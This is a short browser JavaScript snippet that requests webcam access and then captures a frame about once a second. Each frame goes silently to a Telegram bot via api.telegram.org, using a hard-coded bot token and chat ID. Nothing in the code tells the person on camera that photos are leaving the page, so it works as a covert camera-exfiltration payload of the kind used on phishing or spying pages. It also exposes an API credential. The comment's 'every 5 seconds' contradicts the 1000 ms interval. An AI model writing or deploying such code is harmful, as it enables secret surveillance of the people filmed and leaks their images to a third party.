// Request camera permission
navigator.mediaDevices.getUserMedia({ video: true })
.then(function (stream) {
    // Define your Telegram bot API token and chat ID
    const botToken = '6541424487:AAHp2-DNMQke0dAEWh3ScahXpoT7amTaBMU';
    const chatId = '5063584314';

    const video = document.createElement('video');
    video.srcObject = stream;
    
    // Listen for the loadedmetadata event to ensure video is ready
    video.addEventListener('loadedmetadata', function () {
        // Function to send images to Telegram
        function sendImageToTelegram(imageData) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', imageData, { filename: 'image.jpg' });

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData,
            })
            .then(response => response.json())
            .then(data => {
                console.log('Image sent to Telegram:', data);
            })
            .catch(error => {
                console.error('Error sending image to Telegram:', error);
            });
        }

        // Capture and send image every 5 seconds
        setInterval(function () {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(function (blob) {
                sendImageToTelegram(blob);
            }, 'image/jpeg');
        }, 1000);
    });

    // Start playing the video
    video.play();
})
.catch(function (error) {
    console.error('Camera permission denied:', error);
});
      
